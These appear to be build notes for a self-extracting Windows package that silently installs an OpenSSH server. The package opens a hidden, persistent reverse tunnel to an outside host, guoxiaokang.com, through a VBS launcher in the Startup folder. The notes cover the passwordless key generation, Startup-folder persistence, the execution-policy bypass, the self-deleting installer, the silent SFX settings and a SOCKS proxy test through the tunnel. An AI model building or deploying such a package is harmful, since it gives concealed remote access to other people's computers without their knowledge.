##### # Download OpenSSH-Win32 and plink (Win7_x86)
```shell
wget http://192.168.0.22/software/Win32-OpenSSH/OpenSSH-Win32.zip 
unzip OpenSSH-Win32.zip 
mv OpenSSH-Win32 OpenSSH
wget http://192.168.0.22/software/Win32-OpenSSH/plink.exe -O OpenSSH/plink.exe 
``` 
##### #  Download OpenSSH-Win32 and plink (Win7_x64)
```shell
wget http://192.168.0.22/software/Win32-OpenSSH/OpenSSH-Win64.zip 
unzip OpenSSH-Win64.zip 
mv OpenSSH-Win64 OpenSSH
wget http://192.168.0.22/software/Win32-OpenSSH/plink.exe -O OpenSSH/plink.exe 
```
##### # HttpGet
```
wget http://192.168.0.22/software/Win32-OpenSSH/httpget.exe -O OpenSSH/httpget.exe  
```
##### # Generate identity files: 
```
suffix=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
ssh-keygen -t rsa -b 4096 -N '' -C "${suffix}" -f OpenSSH/id_rsa 
sudo apt install putty-tools
puttygen OpenSSH/id_rsa -o OpenSSH/id_rsa.ppk 
``` 
##### # Generate more files:
```
cat << EOF > OpenSSH/sshd_config_default
ListenAddress 127.0.0.1
ListenAddress ::1
Port 2222

PermitEmptyPasswords no
PasswordAuthentication no
PubkeyAuthentication yes
AllowTcpForwarding yes
Subsystem sftp sftp-server.exe
EOF
```
```
CR=$'\r'
cat << EOF > OpenSSH/ssh.bat
timeout 30$CR
cd "%USERPROFILE%\.ssh"$CR
echo yes | plink.exe -i id_rsa.ppk -N -R 22222:localhost:2222 win7@guoxiaokang.com 
EOF
```
```
cat << EOF > OpenSSH/ssh.vbs
Set WshShell = CreateObject("WScript.Shell")$CR
WshShell.Run chr(34) & "%USERPROFILE%\Desktop\ssh.bat" & Chr(34), 0$CR
Set WshShell = Nothing$CR
EOF
```
```
cat << EOF > install.bat
cd "%~dp0"$CR
mkdir "%USERPROFILE%\.ssh"$CR
move OpenSSH\httpget.exe "%USERPROFILE%"\.ssh$CR
move OpenSSH\plink.exe   "%USERPROFILE%"\.ssh$CR
move OpenSSH\id_rsa.ppk  "%USERPROFILE%"\.ssh$CR
move OpenSSH\id_rsa.pub  "%USERPROFILE%"\.ssh\authorized_keys$CR
move OpenSSH\ssh.bat     "%USERPROFILE%\Desktop"$CR
WSCript OpenSSH\ssh.vbs$CR
move OpenSSH\ssh.vbs "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"$CR
$CR
move OpenSSH "%PROGRAMFILES%\"$CR
cd "%PROGRAMFILES%"$CR
icacls OpenSSH /grant Users:(OI)(CI)(F)$CR
powershell -ExecutionPolicy Bypass -File OpenSSH\install-sshd.ps1$CR
powershell Start-Service -Name "sshd"$CR
powershell Start-Service -Name "ssh-agent"$CR
powershell Set-Service -Name "sshd" -StartupType Automatic$CR
powershell Set-Service -Name "ssh-agent" -StartupType Automatic$CR
cd "%~dp0"$CR
del OpenSSH.exe install.bat$CR
EOF
```
##### # Packup
```
echo yes | zip -r OpenSSH.zip OpenSSH install.bat
scp OpenSSH/id_rsa.pub com:/home/win7/.ssh/id_rsa_${suffix}.pub
scp OpenSSH/id_rsa com:/home/win7/.ssh/id_rsa_${suffix}
scp OpenSSH.zip nuc:/var/www/html/OpenSSH.zip
ssh com << EOF 1>/dev/null 2>&1
cat /home/win7/.ssh/id_rsa_${suffix}.pub >> /home/win7/.ssh/authorized_keys
chown win7:win7 /home/win7/.ssh/id_rsa*
chmod 600 /home/win7/.ssh/id_rsa*
EOF
``` 
##### # SFX
``` 
;The comment below contains SFX script commands

Silent=1
Overwrite=1
```
##### # Test
```shell
ssh -o "StrictHostKeyChecking=no" -i .ssh/id_rsa -p 22222 -NfD 18888 a@localhost
curl -x socks5h://localhost:18888 http://www.google.com/
```
